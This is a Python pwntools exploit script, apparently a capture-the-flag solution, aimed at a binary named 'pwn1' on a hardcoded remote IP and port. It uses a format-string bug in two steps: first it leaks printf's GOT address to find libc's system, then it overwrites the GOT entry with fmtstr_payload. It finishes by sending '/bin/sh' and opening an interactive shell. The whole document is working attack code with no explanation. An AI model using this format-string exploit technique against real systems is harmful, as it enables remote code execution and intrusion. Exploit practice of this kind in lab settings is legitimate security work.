from pwn import *
context.log_level = 'debug'

rr=1
if rr:
	cn = remote('115.28.185.220',11111)
	libc = ELF('libc32.so')
else:
	cn = process('./pwn1')
	libc = ELF('/lib32/libc.so.6')

bin = ELF('pwn1')

offset = 6

cn.recv()
cn.sendline('1')
cn.recv()
pay = '%7$s' + p32(bin.got['printf'])
cn.sendline(pay)
data = cn.recvuntil(',you are welcome!\n')
print data
p_printf = u32(data[:4])

p_system = p_printf - libc.symbols['printf'] + libc.symbols['system']


cn.sendline('1')
cn.recv()

pay = fmtstr_payload(6,{bin.got['printf']:p_system})
cn.sendline(pay)

cn.recv()

cn.sendline('1')
cn.recv()
cn.sendline('/bin/sh')
cn.interactive()